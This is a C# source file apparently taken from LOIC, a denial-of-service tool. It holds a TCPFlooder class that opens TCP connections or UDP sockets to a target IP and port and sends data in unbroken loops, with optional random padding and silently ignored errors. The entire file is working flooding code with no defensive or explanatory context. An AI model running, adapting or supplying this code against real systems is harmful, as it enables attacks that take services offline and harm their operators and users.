using PcapDotNet.Base;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using AddressFamily = System.Net.Sockets.AddressFamily;

namespace LOIC
{
	public class TCPFlooder
	{
		public bool IsFlooding;
		public int FloodCount;
		public string IP;
		public int Port;
		public AttackTypes AttackType;
		public int Delay;
		public bool Resp;
		public string Data;
		private bool AllowRandom;

		public TCPFlooder(string ip, int port, AttackTypes attacktype, int delay, bool resp, string data, bool random)
		{
			this.IP = ip;
			this.Port = port;
			this.AttackType = attacktype;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
			this.AllowRandom = random;
		}
		public void Start()
		{
			IsFlooding = true;
			BackgroundWorker bw = new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
			bw.RunWorkerAsync();
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				byte[] buf;
				IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (IsFlooding)
				{
					Socket socket = null;
					if (AttackType == AttackTypes.TcpFlood)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.NoDelay = true;

						try { socket.Connect(RHost); }
						catch { continue; }

						socket.Blocking = Resp;
						try
						{
							while (IsFlooding)
							{
								FloodCount++;
								buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) ));
								socket.Send(buf);
								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
							}
						}
						catch { }
					}
					if (AttackType == AttackTypes.UdpFlood)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						socket.Blocking = Resp;
						try
						{
							while (IsFlooding)
							{
								FloodCount++;
								buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) ));
								socket.SendTo(buf, SocketFlags.None, RHost);
								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
							}
						}
						catch { }
					}
				}
			}
			catch { }
		}
	}
}